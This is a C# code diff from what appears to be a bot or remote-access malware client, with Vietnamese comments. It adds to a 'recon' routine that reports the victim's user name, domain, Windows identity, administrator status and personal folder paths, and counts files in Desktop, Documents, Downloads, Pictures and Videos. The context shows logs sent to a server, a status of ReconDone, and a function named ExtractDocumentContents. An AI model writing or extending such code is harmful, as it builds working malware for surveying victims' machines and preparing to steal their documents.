@@ -345,7 +345,27 @@ public class Bot
             report.AppendLine($"Time: {DateTime.Now}");
             report.AppendLine($"OS: {Environment.OSVersion}");
             report.AppendLine($"User: {Environment.UserName}");
+            report.AppendLine($"User Domain: {Environment.UserDomainName}");
+
+            try
+            {
+                var currentUser = System.Security.Principal.WindowsIdentity.GetCurrent();
+                report.AppendLine($"User (Windows Identity): {currentUser.Name}");
+                report.AppendLine($"Is Elevated (Admin): {IsAdministrator()}");
+            }
+            catch (Exception ex)
+            {
+                report.AppendLine($"[!] Cannot get Windows Identity: {ex.Message}");
+            }
+
+            report.AppendLine("\n[PATH RESOLUTION]");
+            report.AppendLine($"UserProfile: {Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}");
+            report.AppendLine($"Desktop: {Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}");
+            report.AppendLine($"Documents: {Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}");
+            report.AppendLine($"Downloads: {Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")}");
             report.AppendLine("--------------------------------------------------");
+
+
 
             // 1. Lấy thông tin phần cứng (CPU/RAM)
             try
@@ -386,9 +406,14 @@ public class Bot
 
             report.AppendLine("--------------------------------------------------");
 
+            report.AppendLine("[FOLDER EXISTENCE CHECK]");
+            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            CheckFolderContent(userPath, report);
+            report.AppendLine("--------------------------------------------------");
+
             // 2. Quét nhanh Desktop và Documents (Giới hạn độ sâu để tránh quá nặng)
             report.AppendLine("[FILE SYSTEM SCAN - TOP LEVEL]");
-            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            //string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             ScanFolder(userPath, report, 0, 2); // Chỉ quét sâu 2 lớp thư mục
 
             report.AppendLine("--------------------------------------------------");
@@ -431,6 +456,64 @@ public class Bot
             Console.WriteLine($"[RECON ERROR] {ex.Message}");
             await SendLogToServerAsync($"Recon Failed: {ex.Message}");
             currentStatus = BotCommands.ReconDone;
+        }
+    }
+    static void CheckFolderContent(string basePath, StringBuilder report)
+    {
+        try
+        {
+            var foldersToCheck = new[]
+            {
+            ("UserProfile", basePath),
+            ("Desktop", Path.Combine(basePath, "Desktop")),
+            ("Documents", Path.Combine(basePath, "Documents")),
+            ("Downloads", Path.Combine(basePath, "Downloads")),
+            ("Pictures", Path.Combine(basePath, "Pictures")),
+            ("Videos", Path.Combine(basePath, "Videos"))
+        };
+
+            foreach (var (name, path) in foldersToCheck)
+            {
+                if (Directory.Exists(path))
+                {
+                    try
+                    {
+                        var fileCount = Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly).Length;
+                        var dirCount = Directory.GetDirectories(path).Length;
+                        report.AppendLine($"✓ {name}: {path}");
+                        report.AppendLine($"  → {fileCount} files, {dirCount} subfolders");
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        report.AppendLine($"✗ {name}: {path} [ACCESS DENIED]");
+                    }
+                    catch (Exception ex)
+                    {
+                        report.AppendLine($"✗ {name}: {path} [ERROR: {ex.Message}]");
+                    }
+                }
+                else
+                {
+                    report.AppendLine($"✗ {name}: {path} [DOES NOT EXIST]");
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            report.AppendLine($"[!] Folder check failed: {ex.Message}");
+        }
+    }
+    static bool IsAdministrator()
+    {
+        try
+        {
+            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+            var principal = new System.Security.Principal.WindowsPrincipal(identity);
+            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+        }
+        catch
+        {
+            return false;
         }
     }
     static Task ExtractDocumentContents(string documentsPath, StringBuilder report)
